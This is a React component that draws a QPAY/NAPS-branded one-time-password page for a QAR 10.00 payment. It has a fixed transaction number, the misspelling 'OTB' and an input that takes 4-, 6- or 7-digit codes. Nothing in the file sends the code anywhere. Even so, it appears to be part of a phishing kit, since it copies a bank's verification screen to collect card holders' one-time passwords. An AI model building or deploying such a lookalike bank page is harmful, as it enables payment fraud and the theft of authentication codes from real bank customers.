
import React, { useState } from 'react';

interface OTPFormProps {
  onNext: () => void;
}

const OTPForm: React.FC<OTPFormProps> = ({ onNext }) => {
  const [otp, setOtp] = useState('');

  const isValid = otp.length === 4 || otp.length === 6 || otp.length === 7;

  return (
    <div className="w-full bg-[#f8f9fa] flex flex-col items-center pt-0 pb-8 px-4 md:px-8 font-sans" dir="rtl">
      <div className="w-full max-w-[850px]">
        
        {/* Unified Summary Header based on provided image */}
        <div className="flex flex-col items-start mb-8 px-2 gap-4">
          {/* Top: Logo and Amount */}
          <div className="flex items-center justify-between w-full gap-6">
            <div className="flex flex-col items-start">
              <div className="text-[#640d2b] text-[16px] font-bold mb-1">Amount</div>
              <div className="text-[#640d2b] text-[28px] font-bold leading-tight">QAR 10.00</div>
            </div>
            <img 
              src="/qpay.png" 
              alt="QPAY Logo" 
              className="h-[42px] w-auto"
            />
          </div>

          {/* Bottom: Transaction Details */}
          <div className="space-y-1 text-left w-full" dir="ltr">
            <div className="text-[14px] text-[#333]">
              <span className="font-bold">Payment Transaction Number:</span> <span className="font-medium">PRTALQ1768022149127</span>
            </div>
            <div className="text-[14px] text-[#333]">
              <span className="font-bold">Transaction Details:</span> <span className="font-medium">DC</span>
            </div>
          </div>
        </div>

        {/* OTP Container */}
        <div className="border border-[#640d2b] rounded-sm overflow-hidden bg-white shadow-sm" dir="ltr">
          <div className="bg-[#640d2b] text-white px-5 py-3.5 text-left">
            <h2 className="text-[17px] font-medium tracking-tight">
              Enter the One-Time-Password (OTB) you received
            </h2>
          </div>

          <div className="p-10 md:p-14 text-center">
            <div className="max-w-[600px] mx-auto space-y-8">
              <div className="space-y-1">
                <p className="text-[14px] font-bold text-[#333]">
                  For increased security, your bank sent you a password valid for
                </p>
                <p className="text-[14px] font-bold text-[#333]">
                  one time
                </p>
              </div>

              <div className="space-y-3 text-left max-w-[500px] mx-auto">
                <label className="block text-[14px] font-bold text-[#333]">
                  Your OTP *
                </label>
                <input 
                  type="text"
                  maxLength={7}
                  className="w-full h-[40px] border border-gray-400 rounded-sm px-4 text-[16px] outline-none focus:border-[#640d2b] focus:shadow-[0_0_1px_#640d2b] transition-all"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, ''))}
                  autoFocus
                />
              </div>

              <div className="flex justify-start items-center gap-6 pt-2 max-w-[500px] mx-auto">
                <img src="/naps.png" alt="NAPS" className="w-[180px] h-auto" />
              </div>

              <div className="max-w-[500px] mx-auto">
                <button 
                  disabled={!isValid}
                  onClick={onNext}
                  className="w-full bg-[#640d2b] text-white font-bold py-2.5 rounded-sm text-[15px] hover:bg-[#4d0a21] transition-colors disabled:opacity-40 disabled:cursor-not-allowed uppercase tracking-wider shadow-sm"
                >
                  Continue
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OTPForm;
